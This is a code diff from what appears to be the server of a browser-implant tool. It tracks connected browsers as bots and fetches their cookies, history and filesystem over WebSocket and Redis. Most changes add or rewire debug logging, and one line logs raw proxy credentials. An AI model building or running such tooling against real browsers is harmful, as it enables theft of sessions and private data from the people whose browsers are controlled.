@@ -14,6 +14,7 @@ const Users = database.Users;
 const Bots = database.Bots;
 const sequelize = database.sequelize;
 const Sequelize = require("sequelize");
+const { log } = require("async");
 const Op = Sequelize.Op;
 
 const get_secure_random_string = require("./utils.js").get_secure_random_string;
@@ -133,7 +134,7 @@ function get_browser_proxy(input_browser_id) {
 }
 
 function authenticate_client(websocket_connection) {
-  console.log("Authenticating client...");
+  logit("Authenticating client...");
   return new Promise(function (resolve, reject) {
     // For timeout, will reject if no response in 30 seconds.
     setTimeout(function () {
@@ -161,7 +162,7 @@ function authenticate_client(websocket_connection) {
 }
 
 function get_browser_cookie_array(browser_id) {
-  console.log("Getting cookies for browser_id: " + browser_id);
+  logit("Getting cookies for browser_id: " + browser_id);
   return new Promise(function (resolve, reject) {
     // For timeout, will reject if no response in 30 seconds.
     setTimeout(function () {
@@ -194,7 +195,7 @@ function get_browser_cookie_array(browser_id) {
 }
 
 function get_browser_history_array(browser_id) {
-  console.log(`Getting history for browser ${browser_id}`);
+  logit(`Getting history for browser ${browser_id}`);
   return new Promise(function (resolve, reject) {
     setTimeout(function () {
       reject(`Get history RPC called timed out.`);
@@ -220,7 +221,7 @@ function get_browser_history_array(browser_id) {
 }
 
 function manipulate_browser(browser_id, path_uri) {
-  console.log(`Manipulating browser ${browser_id} with path ${path_uri}`);
+  logit(`Manipulating browser ${browser_id} with path ${path_uri}`);
   return new Promise(function (resolve, reject) {
     // For timeout, will reject if no response in 30 seconds.
     setTimeout(function () {
@@ -233,15 +234,16 @@ function manipulate_browser(browser_id, path_uri) {
       id: message_id,
       version: SERVER_VERSION,
       action: "GET_FILESYSTEM",
-      data: {
-        path_uri: path_uri,
-      },
+      data: path_uri,
     };
 
     REQUEST_TABLE.set(message_id, resolve);
-    const subscription_id = `TOPROXY_${browser_id}`;
+
+    subscriber.subscribe(`TOPROXY_${browser_id}`);
+
+    const subscription_id = `TOBROWSER_${browser_id}`;
     subscriber.subscribe(subscription_id);
-    publisher.publish(`TOBROWSER_${browser_id}`, JSON.stringify(message));
+    publisher.publish(subscription_id, JSON.stringify(message));
   });
 }
 
@@ -321,7 +323,7 @@ async function get_authentication_status(inputRequestDetail) {
 
   if (!proxy_authentication || !proxy_authentication.includes("Basic")) {
     logit(`No proxy credentials provided!`);
-    console.log(proxy_authentication);
+    logit(proxy_authentication);
     return false;
   }
 
@@ -477,7 +479,9 @@ async function initialize_new_browser_connection(ws) {
   // Set up a subscription in redis for when we get a new
   // HTTP proxy request that we need to send to the browser
   // connected to use via WebSocket.
+
   subscriber.subscribe(`TOBROWSER_${browser_id}`);
+  logit(`New subscriber: TOBROWSER__${browser_id}`);
 
   // Check the database to see if we already have this browser
   // Recorded in the DB.
@@ -564,17 +568,26 @@ async function initialize() {
 
   // Called when a new redis subscription is added
   subscriber.on("subscribe", function (channel, count) {
-    //logit(`New subscription created for channel ${channel}, bring total to ${count}.`);
+    logit(
+      `New subscription created for channel ${channel}, bring total to ${count}.`
+    );
   });
 
   // Called when a new message is written to a channel
   subscriber.on("message", function (channel, message) {
-    //logit(`Received a new message at channel '${channel}', message is '${message}'`);
+    logit(
+      `Received a new message at channel '${channel}', message is '${message
+        .toString()
+        .slice(0, 200)}'`
+    );
 
     // For messages being sent to the browser from the proxy
     if (channel.startsWith("TOBROWSER_")) {
       const browser_id = channel.replace("TOBROWSER_", "");
       const browser_websocket = get_browser_proxy(browser_id);
+      console.log(
+        `${browser_id}-${browser_websocket} Send: ${message.toString()}`
+      );
       browser_websocket.send(message);
       return;
     }
@@ -602,7 +615,7 @@ async function initialize() {
 
       // Check if we're tracking this response
       if (REQUEST_TABLE.has(inbound_message.id)) {
-        //logit(`Resolving function for message ID ${inbound_message.id}...`);
+        logit(`Resolving function for message ID ${inbound_message.id}...`);
         const resolve = REQUEST_TABLE.take(inbound_message.id);
         resolve(inbound_message.result);
       }
@@ -646,6 +659,11 @@ async function initialize() {
 
     ws.on("message", function incoming(message) {
       try {
+        logit(
+          `Received a new message from the browser: ${message
+            .toString()
+            .slice(0, 200)}`
+        );
         var inbound_message = JSON.parse(message);
       } catch (e) {
         logit(`Error parsing message received from browser:`);
